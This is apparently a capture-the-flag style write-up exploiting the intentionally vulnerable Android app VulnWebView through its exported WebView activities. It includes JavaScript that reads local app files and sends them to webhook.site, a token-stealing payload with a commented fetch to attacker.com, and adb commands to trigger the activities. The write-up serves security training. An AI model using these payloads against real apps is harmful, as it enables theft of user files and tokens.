---
title: "VulnWebView - AllSafe"
date: 2026-05-09
categories: [android, allsafe]
tags: [webview, jadx, adb]
---
### Objective

- Exploit a misconfigured exported WebView activity to read sensitive local files from the app without a rooted device.

#### `RegistrationWebView`

- The first step was to review the `AndroidManifest.xml` using JADX to identify potential entry points. I searched for exported activities and found two candidates:
    
    ```xml
    <activity
        android:name="com.tmh.vulnwebview.SupportWebView"
        android:exported="true"/>
    <activity
        android:name="com.tmh.vulnwebview.RegistrationWebView"
        android:exported="true"/>
    ```
    
- Found 2 exported WebView activities. Focused on `RegistrationWebView` first.
- Opened `RegistrationWebView` in JADX and went to `onCreate()` → `loadWebView()`:
    
    ![image.png](attachment:62341295-9b31-46a1-b054-cf51c5d017f7:image.png)
    
- **3 critical findings:**
    
    
    | Finding | Impact |
    | --- | --- |
    | `setAllowUniversalAccessFromFileURLs(true)` | This is the most dangerous setting. When combined with JavaScript execution, it allows JS code running from a `file://` scheme context to access *other* local files via `file://` and, crucially, bypasses the Same-Origin Policy (SOP), allowing the script to send data to external HTTP/HTTPS domains. |
    | `setJavaScriptEnabled(true)` | JS execution enabled in WebView —> XSS |
    | `reg_url` extra loaded directly | Attacker controls what the WebView loads |
- **The `is_reg` logic:**
    - `getBoolean("is_reg", false)` — the `false` is the **default value.**
    - If `is_reg` is not passed in the intent → defaults to `false` → loads **`reg_url**.` under our control as we pass it as extra string.
    - If `is_reg = true` → loads internal `registration.html` (not useful)
    - So we simply **don't pass `is_reg`** → WebView loads our controlled URL

**Developing the Exploit Strategy**

- we can craft a malicious local HTML file containing JavaScript to read content of sensitive files, then send it to external server under our control (like Webhook.site).
    
    ```jsx
    <script>
    var xhr = new XMLHttpRequest();   // reads the local file
    var xhr2 = new XMLHttpRequest();  // sends the data out
    
    xhr.onreadystatechange = () => {
        if (xhr.readyState === 4) {
            // POST the file contents (Base64 encoded) to attacker's server
            xhr2.open("POST", 'https://webhook.site/YOUR-ID/exfil');
            xhr2.setRequestHeader("Content-Type", "x-www-form-urlencoded");
            xhr2.send('data=' + btoa(xhr.responseText));
        }
    };
    
    // Target file to steal
    xhr.open("GET", "file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml", true);
    xhr.send();
    </script>
    ```
    
- **Result:** we got the response, just decode it.
    
    ![image.png](attachment:c2260c2e-5893-4c24-912f-f86d005e5228:image.png)
    
    ![image.png](attachment:4ac95bf0-8946-4aaa-a702-5a6b7d8dfba4:ebe306ca-81c4-4e03-a6e9-1e03e6a53dc9.png)
    

#### `SupportWebView`

- While reviewing the `AndroidManifest.xml`, I identified another exported activity:
    
    ```xml
    <activity
        android:name="com.tmh.vulnwebview.SupportWebView"
        android:exported="true"/>
    ```
    
- analyzing the `SupportWebView` class in JADX, I examined the `loadWebView()` method and found several alarming configurations:
    
    ![image.png](attachment:fd3332ec-c176-4c56-9984-85d833bb91a7:image.png)
    
    - **Arbitrary URL Loading:** The WebView loads whatever URL is provided in the `support_url` intent extra, giving an attacker full control over the displayed content.
    - **`setJavaScriptEnabled(true)`:** JavaScript execution is allowed.
    - **Insecure `JavascriptInterface`:** This grants any JavaScript executing in the WebView direct access to call the exposed Java methods of the `WebAppInterface` class.
- I inspected the `WebAppInterface` class to see what methods were exposed to the web context. I found the following method annotated with `@JavascriptInterface`:
    
    ```java
    @JavascriptInterface
    public String getUserToken() {
        return SupportWebView.getUserToken();
    }
    ```
    
- This means any JavaScript code running inside that WebView can simply call `Android.getUserToken()` to retrieve the user's UUID token.
- Since we control the URL via `support_url`, we can point the WebView to a local HTML file containing our malicious JavaScript. The script will access the exposed native object, call the method, and capture the token.
    
    ```java
    <!DOCTYPE html>
    <html>
    <body>
        <h2>Stealing Token via JavascriptInterface</h2>
        <script>
            // Note the capital 'A' matching the interface name defined in Java
            var token = Android.getUserToken();
            alert("App Compromised! Token: " + token);
            document.write("<h1>Stolen Token: " + token + "</h1>");
            
            // In a real-world scenario, we would exfiltrate it:
            // fetch('https://attacker.com/log?token=' + token);
        </script>
    </body>
    </html>
    ```
    
- I pushed the payload to the device and used `adb` to invoke the exported activity, passing the path to our local file in the `support_url` extra:
    
    ```bash
    **# Push the payload
    adb push test.html /sdcard/
    
    # Trigger the vulnerable activity
    adb shell am start -n com.tmh.vulnwebview/.SupportWebView \
      --es "support_url" "file:///sdcard/test.html"**
    ```
    
    ![image.png](attachment:c703d9ac-d349-492f-9754-07ea6c3ced44:image.png)
    

### Another Vulnerability may arise in webView

#### `setWebContentsDebuggingEnabled`

- A developer setting that enables **remote debugging of WebView** via Chrome DevTools from any machine on the same network
- Enabled by: `WebView.setWebContentsDebuggingEnabled(true)`

---

#### How to Access It

![image.png](attachment:faa8f257-ab5e-400c-9d76-3713cbb4bec6:image.png)

- Open Chrome → go to `chrome://inspect/#devices`
- You'll see the device and WebView listed → click **inspect**
- Full Chrome DevTools opens connected live to the WebView

---

#### What You Can Do

- **Console tab** → run any JS directly on the device
- **Elements tab** → view and modify the DOM
- **Network tab** → see all network requests
- **Sources tab** → view loaded files and scripts
